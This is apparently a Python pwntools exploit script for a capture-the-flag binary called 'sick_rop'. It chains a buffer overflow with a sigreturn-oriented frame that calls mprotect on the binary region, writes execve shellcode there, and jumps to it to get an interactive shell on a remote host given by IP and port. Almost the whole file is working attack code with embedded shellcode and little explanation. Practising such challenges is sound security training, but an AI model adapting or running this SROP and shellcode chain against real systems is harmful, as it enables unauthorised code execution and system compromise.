from pwn import *
e = ELF('./sick_rop')
context(arch='amd64', os='linux', binary=e)
context.log_level = 'debug'

padding = b'a'*(0x20+8)
bin_start = 0x00400000
syscall = 0x00401014
vuln_ptr = 0x4010d8
shellcode = b'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'

#r = process('./sick_rop')
#r = gdb.debug('./sick_rop', 'set follow-fork-mode child\nb *vuln+32\nc')
r = remote('206.189.24.162', 32288)

# 1. mprotect part of the binary region so that it is writable with sigrop
# 2. write shellcode to that region with the write function 
# 3. ret2shellcode 

payload = b''
payload += b'a'*(0x20+8)

frame = SigreturnFrame()
frame.rax = 0xa 
frame.rdi = bin_start 
frame.rsi = 0x2000 # just to be safe
frame.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
frame.rsp = vuln_ptr
frame.rip = syscall
payload += p64(e.sym['vuln']) + p64(syscall) + bytes(frame)

r.sendline(payload+b'$0')
r.sendlineafter(b'$0', b'a'*(0xf-2)+b'1')

payload = b''
payload += b'a'*(0x20+8)
payload += p64(vuln_ptr+16)
payload += shellcode 
r.sendlineafter(b'1', payload)

r.interactive()

